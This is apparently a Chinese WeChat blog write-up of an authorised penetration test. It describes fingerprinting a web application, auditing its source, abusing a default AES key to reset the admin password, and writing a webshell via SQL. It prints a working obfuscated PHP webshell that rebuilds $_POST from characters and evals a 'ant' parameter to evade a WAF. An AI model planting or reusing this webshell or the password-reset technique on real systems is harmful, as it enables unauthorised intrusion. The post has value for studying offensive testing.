---
title: “搜打撤”在渗透测试中的运用
url: https://mp.weixin.qq.com/s/a7Q1uVJSS-jSO_b7Ha_G6A
source: Doonsec's feed
date: 2026-01-08
fetch_date: 2026-01-09T03:28:56.758125
---

# “搜打撤”在渗透测试中的运用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHp0Iic8XicPgE7l7MW246dYjVIIfmDyln9UlOGuUvGP68Yq1CgFOhSiaOxQ/0?wx_fmt=jpeg)

# “搜打撤”在渗透测试中的运用

原创

kingman

kingman安全

![]()

在小说阅读器中沉浸阅读

声明:

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。同时所有相关行为均已取得授权，未经作者同意禁止转载

游戏的套路：搜打撤

渗透的套路：信息收集->审0day->getshell

如下案例均有授权、未经授权严谨非法渗透

信息收集

---

做个会点鼠标的猴子就行

![](https://mmbiz.qpic.cn/mmbiz_jpg/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpH4xfK0SiaCUaVoqu3dFBuebukA4Y2fO43sFFFnlQp3ELZQaNj8aD3dg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpbmXEuibsnicnUR5iay5orf3iaSFf5prOjyg5457PpmrlSAP6RfTgjXriaGQ/640?wx_fmt=png&from=appmsg)

常规点点点、进页面就可以开始信息收集了

信息收集小技巧:通过F12对前端元素进行审查、查找觉得异常的点再放入搜索引擎收集，基本上靠特征能识别出源

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHp5SsT9cPyFIKXaN0ZrAmB4MdU6eqIWInCGxwYKqzkMwogUtfRufufow/640?wx_fmt=png&from=appmsg)

于是乎靠着上述方法找到了对应的源码（厚码毕竟0day大家不要乱搞）

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpae7pg3y4vXlDl5HQmvnLAHvSFMetszWhOcZ5bqM5n2r3Htc4265NAQ/640?wx_fmt=png&from=appmsg)

代码审计

---

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpCnU1WRK7yQbSfgofX7oVu1mu9eM4tQJ6I4GSFk42G1nicDCWQf1oJgw/640?wx_fmt=png&from=appmsg)

大家都不爱看审计这就跳过流程吧

总之在控制器里找到了对应方法且用的是默认AES密钥加密

随后就可以重置任意用户密码，uid为1的就是管理员

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpDY4XprsrUBD5laoBLk7S1ictaQ3o5oOjLwU5ox0hbl8fuibzuNPXXj2A/640?wx_fmt=png&from=appmsg)

接着登入后台

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpKugFFFX1PGl0kAW9cb9jK5Y5TRe2HpKBAParc2LxEyeKX73hmoWosg/640?wx_fmt=png&from=appmsg)

sql写shell

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpUjb9LeS8lMTp8BfuO0VwHun3P1siaI1ckX8UpwRPqhLiafX2icFM7icicmw/640?wx_fmt=png&from=appmsg)

waf明显流量测拦了、上免杀

```
$chars = ['_', 'P', 'O', 'S', 'T'];$method = '';foreach($chars as $char) {    $method .= $char;}$keys = ['a', 'n', 't'];$param = implode('', $keys);$c = $$method;      $d = $c[$param];   ob_start();@eval(hex2bin(base64_encode($d)));ob_end_clean();
```

Getshell

---

![](https://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk1yyWjQMEWDLTjD0GekbAHpqFZse8F842ouLPOFRl4KNW1Os4gTC6icTzh48XtzIiabnNGQP9c0WKdw/640?wx_fmt=png&from=appmsg)

爽文结束

预览时标签不可点

内容含AI生成图片

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk33j31ajLZ0yloe8cj2zYIaKaL9mGiaX3eEzZ0Y6HH1J15GyY5F0hLZ5GMlILlw81dcxNLoK3hq5cQ/0?wx_fmt=png)

kingman安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk33j31ajLZ0yloe8cj2zYIaKaL9mGiaX3eEzZ0Y6HH1J15GyY5F0hLZ5GMlILlw81dcxNLoK3hq5cQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过